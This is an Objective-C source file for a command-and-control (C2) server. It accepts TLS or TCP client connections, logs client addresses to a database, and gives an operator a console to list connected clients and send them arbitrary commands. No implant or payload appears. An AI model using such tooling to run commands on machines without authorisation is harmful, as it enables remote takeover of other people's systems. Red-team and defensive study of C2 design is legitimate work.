#import "C2Server.h"
#import "ClientHandler.h"
#import "TCPListener.h"
#import "SSLWrapper.h"
#import "DatabaseManager.h"
#import "Logger.h"
#import "CommandProcessor.h"

@interface C2Server ()
@property (nonatomic, strong) TCPListener *listener;
@property (nonatomic, strong) SSLWrapper *sslWrapper;
@property (nonatomic, strong) DatabaseManager *dbManager;
@property (nonatomic, strong) Logger *logger;
@property (nonatomic, strong) CommandProcessor *cmdProcessor;
@property (nonatomic, assign) BOOL isRunning;
@property (nonatomic, strong) dispatch_semaphore_t semaphore;
@end

@implementation C2Server

- (instancetype)init {
    self = [super init];
    if (self) {
        _connectedClients = [NSMutableArray array];
        _clientQueue = dispatch_queue_create("com.c2server.client", DISPATCH_QUEUE_CONCURRENT);
        _semaphore = dispatch_semaphore_create(1);
        _logger = [[Logger alloc] initWithLogFile:@"logs/c2_server.log"];
        _dbManager = [[DatabaseManager alloc] init];
        _cmdProcessor = [[CommandProcessor alloc] initWithServer:self];
        _isRunning = NO;
    }
    return self;
}

- (BOOL)initializeWithConfigPath:(NSString *)configPath {
    NSString *resolvedConfigPath = [configPath stringByStandardizingPath];
    NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:resolvedConfigPath];
    if (!config) {
        [self.logger logError:[NSString stringWithFormat:@"Failed to load configuration from %@", configPath]];
        return NO;
    }

    NSString *configDirectory = [resolvedConfigPath stringByDeletingLastPathComponent];
    self.port = [config[@"port"] integerValue];
    self.sslEnabled = [config[@"ssl_enabled"] boolValue];
    self.certPath = [self resolvedPath:config[@"cert_path"] relativeToDirectory:configDirectory];
    self.keyPath = [self resolvedPath:config[@"key_path"] relativeToDirectory:configDirectory];

    self.sslWrapper = [[SSLWrapper alloc] initWithCertificatePath:self.certPath
                                                          keyPath:self.keyPath
                                                          enabled:self.sslEnabled];
    NSError *sslError = nil;
    if (![self.sslWrapper validateConfiguration:&sslError]) {
        [self.logger logError:sslError.localizedDescription];
        return NO;
    }

    NSString *dbPath = [self resolvedPath:config[@"database_path"] relativeToDirectory:configDirectory];
    if (![self.dbManager initializeWithPath:dbPath]) {
        [self.logger logError:@"Failed to initialize database"];
        return NO;
    }

    self.listener = [[TCPListener alloc] initWithPort:self.port
                                            sslEnabled:self.sslEnabled
                                              certPath:self.certPath
                                               keyPath:self.keyPath];

    if (!self.listener) {
        [self.logger logError:@"Failed to create listener"];
        return NO;
    }

    [self.logger logInfo:[NSString stringWithFormat:@"C2 Server initialized on port %ld", (long)self.port]];
    return YES;
}

- (NSString *)resolvedPath:(NSString *)configuredPath relativeToDirectory:(NSString *)directory {
    if (configuredPath.length == 0) {
        return @"";
    }

    if ([configuredPath isAbsolutePath]) {
        return [configuredPath stringByStandardizingPath];
    }

    return [[directory stringByAppendingPathComponent:configuredPath] stringByStandardizingPath];
}

- (BOOL)start {
    if (self.isRunning) {
        return YES;
    }

    if (![self acceptConnections]) {
        [self.logger logError:@"C2 Server failed to bind listener"];
        return NO;
    }

    self.isRunning = YES;

    [self.logger logInfo:@"C2 Server started"];
    printf("\n[+] C2 Server listening on port %ld\n", (long)self.port);
    return YES;
}

- (BOOL)acceptConnections {
    return [self.listener startListening:^(id clientSocket, NSError *error) {
        if (error) {
            [self.logger logError:[NSString stringWithFormat:@"Accept error: %@", error]];
            return;
        }

        dispatch_async(self.clientQueue, ^{
            [self handleNewClient:clientSocket];
        });
    }];
}

- (void)handleNewClient:(id)clientSocket {
    ClientHandler *handler = [[ClientHandler alloc] initWithClientInfo:clientSocket
                                                              listener:self.listener
                                                      commandProcessor:self.cmdProcessor
                                                                logger:self.logger];

    dispatch_semaphore_wait(self.semaphore, DISPATCH_TIME_FOREVER);
    [self.connectedClients addObject:handler];
    dispatch_semaphore_signal(self.semaphore);

    [self.logger logInfo:[NSString stringWithFormat:@"New client connected. Total: %lu",
                          (unsigned long)self.connectedClients.count]];

    NSDictionary *clientInfo = [clientSocket isKindOfClass:[NSDictionary class]] ? (NSDictionary *)clientSocket : nil;
    NSString *clientAddress = clientInfo[@"address"] ?: @"unknown";
    [self.dbManager addClient:@{
        @"ip": clientAddress,
        @"connected_at": [NSDate date]
    }];

    [handler run];

    dispatch_semaphore_wait(self.semaphore, DISPATCH_TIME_FOREVER);
    [self.connectedClients removeObject:handler];
    dispatch_semaphore_signal(self.semaphore);

    [self.logger logInfo:[NSString stringWithFormat:@"Client disconnected. Remaining: %lu",
                          (unsigned long)self.connectedClients.count]];
}

- (void)interactiveMode {
    printf("\nC2 Interactive Console\n");
    printf("======================\n");
    printf("Commands: list, interact <id>, help, exit\n\n");
    
    char input[1024];
    while (self.isRunning) {
        printf("C2> ");
        fflush(stdout);

        if (fgets(input, sizeof(input), stdin) != NULL) {
            NSString *command = [NSString stringWithUTF8String:input];
            command = [command stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];

            if ([command isEqualToString:@"exit"]) {
                [self stop];
                break;
            } else if ([command isEqualToString:@"list"]) {
                [self listClients];
            } else if ([command hasPrefix:@"interact "]) {
                NSArray *parts = [command componentsSeparatedByString:@" "];
                if (parts.count == 2) {
                    NSInteger clientId = [parts[1] integerValue];
                    [self interactWithClient:clientId];
                }
            } else if ([command isEqualToString:@"help"]) {
                [self showHelp];
            }
        }
    }
}

- (void)listClients {
    dispatch_semaphore_wait(self.semaphore, DISPATCH_TIME_FOREVER);
    printf("\nConnected clients: %lu\n", (unsigned long)self.connectedClients.count);
    for (NSInteger i = 0; i < self.connectedClients.count; i++) {
        ClientHandler *client = self.connectedClients[i];
        printf("  [%ld] %s\n", (long)i, [[client displayName] UTF8String]);
    }
    printf("\n");
    dispatch_semaphore_signal(self.semaphore);
}

- (void)interactWithClient:(NSInteger)clientId {
    dispatch_semaphore_wait(self.semaphore, DISPATCH_TIME_FOREVER);
    if (clientId >= 0 && clientId < self.connectedClients.count) {
        ClientHandler *client = self.connectedClients[clientId];
        dispatch_semaphore_signal(self.semaphore);
        
        printf("Interacting with client %ld. Type 'back' to return.\n", (long)clientId);
        
        char cmdBuffer[2048];
        while (YES) {
            printf("client> ");
            fflush(stdout);

            if (fgets(cmdBuffer, sizeof(cmdBuffer), stdin) != NULL) {
                NSString *cmd = [NSString stringWithUTF8String:cmdBuffer];
                cmd = [cmd stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];

                if ([cmd isEqualToString:@"back"]) {
                    break;
                }

                NSString *response = [client executeOperatorCommand:cmd];
                printf("%s\n", response.length > 0 ? [response UTF8String] : "(no response)");
            }
        }
    } else {
        dispatch_semaphore_signal(self.semaphore);
        printf("Invalid client ID\n");
    }
}

- (void)showHelp {
    printf("\nAvailable commands:\n");
    printf("  list           - List all connected clients\n");
    printf("  interact <id>  - Interact with a specific client\n");
    printf("  help           - Show this help message\n");
    printf("  exit           - Shutdown server\n\n");
}

- (void)stop {
    if (!self.isRunning) {
        return;
    }

    self.isRunning = NO;
    [self.listener stopListening];
    [self.logger logInfo:@"C2 Server stopped"];
    printf("\n[-] Server shutdown complete\n");
}

- (void)dealloc {
    [self stop];
}
@end
